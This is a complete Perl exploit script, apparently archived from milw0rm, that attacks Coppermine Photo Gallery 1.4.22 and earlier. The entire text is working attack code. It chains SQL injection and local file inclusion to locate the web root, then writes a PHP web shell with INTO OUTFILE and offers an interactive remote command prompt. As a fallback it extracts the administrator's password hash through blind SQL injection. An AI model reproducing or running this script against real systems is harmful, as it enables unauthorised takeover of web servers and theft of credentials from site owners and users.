<html><head><title>Coppermine Photo Gallery <= 1.4.22 Remote Exploit</title></head><pre>#!/usr/bin/perl
# Coppermine Photo Gallery &lt;= 1.4.22 Remote Exploit
# Need register_globals = on and magic_quotes_gpc = off
# Based on vulnerabilities discussed at http://www.milw0rm.org/exploits/8713
# Coded by girex

use LWP::UserAgent;

if(not defined $ARGV[0])
{
     banner();
     print &quot;[-] Usage: perl $0 [host] [path]\n&quot;;
     print &quot;[-] Example: perl $0 localhost /gallery/\n\n&quot;;
     exit;
}

my $lwp = new LWP::UserAgent or die;
 
my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= '/' unless $target =~ /^http:\/\/(.?)\/$/;

my $uid = '1';	# Change if need
my @chars  =  ('1'..'9', 'a'..'f'); 
my $injection = '&lt;?php if(isset($_SERVER[HTTP_CMD])) {echo 12345; passthru(stripslashes($_SERVER[HTTP_CMD]));}?&gt;';

banner();
$lwp-&gt;default_header('Accept-Language: en-us,en;q=0.5');

my $html = inj_request(' WHERE x');	# Wrong query to obtain an error

if(not defined $html)
{
    print &quot;[-] Request mistake. Exploit terminated!\n&quot;;
    exit ();
}
elsif($html =~ /There was an error while processing a database query/)
{
    print &quot;[+] Site vulnerable. Trying to retrieve absolute path...\n&quot;;
}
else
{
    print &quot;[-] Site not vulnerable to SQL Injection in thumbnails.php\n&quot;;
    print &quot;[-] Maybe magic_quotes = On or register_globals = Off\n&quot;;
    end_try();
}

# This LFI includes README.txt that contais php code with phpinfo() function.
my $res = $lwp-&gt;get(&quot;${target}index.php?GLOBALS[USER][ID]=5b83a5f92603efcdb65d47c9a2991d6b&amp;GLOBALS[USER][lang]=../README.txt%00&quot;);

if($res-&gt;content =~ /&lt;tr&gt;&lt;td class=\&quot;e\&quot;&gt;_SERVER\[\&quot;SCRIPT_FILENAME\&quot;\]&lt;\/td&gt;&lt;td class=\&quot;v\&quot;&gt;(.*)index\.php&lt;\/td&gt;&lt;\/tr&gt;/)
{
     $path_to = $1;
}
else
{
    print &quot;[-] Unable to retrieve the absolute path. Problems with LFI.\n&quot;;
    end_try();
}

$html = inj_request(&quot;AND 1=2 UNION ALL SELECT '${injection}' INTO OUTFILE '${path_to}logs/log_db.inc.php&quot;);
my $res = $lwp-&gt;get($target.'logs/log_db.inc.php');

if($res-&gt;is_success)
{
    print &quot;[+] Shell injected at ${path_to}logs/log_db.inc.php\n\n&quot;;
}
else
{
    print &quot;[-] Shell upload failed, MySQL cannot write to logs path!\n\n&quot;;
    print &quot;[+] Attempting to retrieve admin's md5..\n&quot;;
    blind_sql();

    if(length($hash) != 32)
    {
        print &quot;\n\n[-] Exploit mistake: unable to retrieve admin's md5\n&quot;;
    }
    else
    { 
	print &quot;\n&quot;;
    }

    end_try();
}
                                                          
while(1)
{
    print &quot;[+] coppermine\@shell:~\$ &quot;;
    chomp(my $cmd = &lt;STDIN&gt;);
    
    end_try() if $cmd eq 'exit';
     
    $lwp-&gt;default_header( 'CMD' =&gt; $cmd );
    my $res = $lwp-&gt;get($target.'logs/log_db.inc.php');
         
    if($res-&gt;is_success and $res-&gt;content =~ /12345/)
    {
        print &quot;\n&quot;. substr($res-&gt;content, index($res-&gt;content, '12345') + 5).&quot;\n&quot;;
    }
    else
    {
        print &quot;[-] Something wrong, command execution failed!\n&quot;;
        last;
    }
}




sub inj_request
{
    my $sql = shift;
    my $res = $lwp-&gt;get($target. &quot;thumbnails.php?lang=english&amp;album=alpha&amp;GLOBALS[cat]=999'+${sql}&quot;);

    if($res-&gt;is_success)
    {
	return $res-&gt;content;
    }

    return undef;
}

sub blind_sql
{
    our $hash = '';
    my $prefix = get_prefix() or 'cpg14x';
    my $username = get_username() or 'admin';

    $| = 1;
    print &quot;[+] username: ${username} - md5 hash: &quot;;

    for($i = 1; $i &lt;= 32; $i++)
    {
	foreach $char(@chars)
	{
	    $html = inj_request(&quot;OR+SUBSTRING((SELECT+user_password+FROM+${prefix}_users+WHERE+user_id=${uid}),${i},1)='${char}'%23&quot;);
	
	    if($html =~ /The selected album\/file does not exist/)
	    {
		$hash .= $char;
                syswrite(STDOUT, $char, 1);
		last;
	    }
	}
    
	last if $i != length($hash);
    }   
}

sub get_prefix		# File update.php shows the query executed to update the tables, we can get table prefix from it
{
    my $rv = undef;
    my $res = $lwp-&gt;get($target.'update.php');
    
    if($res-&gt;is_success and $res-&gt;content =~ /CREATE TABLE IF NOT EXISTS (\w+)_sessions/)
    {
	$rv = $1;
    }

    return $rv;
}

sub get_username	
{
    my $rv = undef;
    my $res = $lwp-&gt;get($target.&quot;profile.php?lang=english&amp;uid=${uid}&quot;);

    if($res-&gt;content =~ /&lt;td class=&quot;tableh1&quot; colspan=&quot;2&quot;&gt;(.*)'s profile&lt;\/td&gt;/)
    {
	$rv = $1;
    }

    return $rv;
}

sub end_try
{
    my $res = $lwp-&gt;get($target.'register.php?lang=english');

    if($res-&gt;is_success and $res-&gt;content !~ /You don't have permission to access this page/)
    {
        print &quot;\n[+] Target can be vulnerable to SQL Injection for registered users\n&quot;;
        print &quot;[+] See http://www.milw0rm.org/exploits/8713 to know how to exploit it!\n\n&quot;;
    }
    else
    {
        print &quot;\n[-] The target is NOT vulnerable to the SQL Injection for registered users\n\n&quot;;
    }

    exit;
}

sub banner
{
     print &quot;\n[+] Coppermine Photo Gallery &lt;= 1.4.22 Remote Exploit\n&quot;;
     print &quot;[+] Coded by girex\n&quot;;
     print &quot;\n&quot;;
}

# milw0rm.com [2009-05-19]</pre></html>